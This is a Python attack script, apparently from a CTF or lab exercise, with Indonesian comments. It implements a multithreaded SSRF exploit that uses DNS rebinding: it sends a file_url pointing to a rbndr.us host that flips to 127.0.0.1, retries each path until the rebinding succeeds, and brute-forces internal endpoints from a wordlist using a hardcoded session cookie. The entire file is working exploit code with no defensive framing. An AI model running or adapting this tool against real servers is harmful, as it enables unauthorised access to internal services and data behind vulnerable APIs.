#!/usr/bin/python3
import requests
import threading
import sys
import argparse
from colorama import Fore, Style

# Global setup
lock = threading.Lock()
word_index = 0
wordlist = []
args = None

def print_success(msg): print(f"{Fore.GREEN}[+]{Style.RESET_ALL} {msg}")
def print_info(msg): print(f"{Fore.BLUE}[*]{Style.RESET_ALL} {msg}")
def print_fail(msg): print(f"{Fore.RED}[-]{Style.RESET_ALL} {msg}")

def fuzz_internal_endpoints():
    global word_index, wordlist, args
    
    headers = {"Content-Type": "application/json"}
    cookies = {
        "uuid_hash": "8f282a4de56b5a379083e16339d84cd9bee0f64503f9159c5ca7a89f2484a121cae32d23afed9fc673225e1b1ac4beb468964e832a8ef43a2758a475aa2703ed"
    }

    while True:
        # Thread-safe reading dari wordlist
        with lock:
            if word_index >= len(wordlist):
                break
            word = wordlist[word_index]
            word_index += 1

        json_payload = {"file_url": f"http://7f000001.d8ef2678.rbndr.us/{word}"}
        attempt = 0

        # Loop per kata sampai tembus (DNS Rebinding Logic)
        while True:
            attempt += 1
            try:
                res = requests.post(args.url, headers=headers, json=json_payload, cookies=cookies, timeout=5)
                
                # VERBOSE
                if args.verbose:
                    status_line = f"{Fore.WHITE}[v] Path: /{word:<15} | Attempt: {attempt} | Status: {res.status_code}{Style.RESET_ALL}"
                    print(status_line, end='\r')

                # LOGIKA 1: Success (200 OK)
                if res.status_code == 200:
                    if args.verbose: print() # Baris baru setelah \r
                    print_success(f"HIT! /{word:<20} -> {res.status_code} (Size: {len(res.text)})")
                    break

                # LOGIKA 2: Final 404 (Localhost reached, but file not there)
                if res.status_code == 404 and "resource not found" in res.text:
                    if args.verbose:
                        print()
                        print_fail(f"NOT FOUND (Internal): /{word}")
                    break

                # LOGIKA 3: Retry (403 Forbidden atau 404 Transien '!!1')
                if res.status_code == 403 or "Error 404 (Not Found)!!1" in res.text:
                    continue

            except requests.exceptions.RequestException:
                if args.verbose:
                    print(f"{Fore.RED}[v] Net Error on /{word} (Retrying...){Style.RESET_ALL}", end='\r')
                continue

def main():
    global wordlist, args
    parser = argparse.ArgumentParser(description="Multithreaded SSRF DNS Rebinding Fuzzer")
    parser.add_argument("-w", "--wordlist", default="/usr/share/dirb/wordlists/common.txt", help="Path ke wordlist")
    parser.add_argument("-u", "--url", default="http://127.0.0.1/api/v2/upload", help="Target URL API")
    parser.add_argument("-v", "--verbose", action="store_true", help="Aktifkan mode verbose")
    parser.add_argument("-t", "--threads", type=int, default=15, help="Jumlah thread (default: 15)")
    
    args = parser.parse_args()

    # Load wordlist
    try:
        with open(args.wordlist, "r") as f:
            wordlist = [line.strip() for line in f.readlines()]
    except FileNotFoundError:
        print_fail(f"Wordlist tidak ditemukan di: {args.wordlist}")
        return

    print_info(f"Starting Fuzzing | Target: {args.url} | Threads: {args.threads}")
    print("-" * 70)

    threads = []
    for _ in range(args.threads):
        t = threading.Thread(target=fuzz_internal_endpoints)
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    print("\n")
    print_info("Fuzzing Selesai.")

if __name__ == "__main__":
    main()
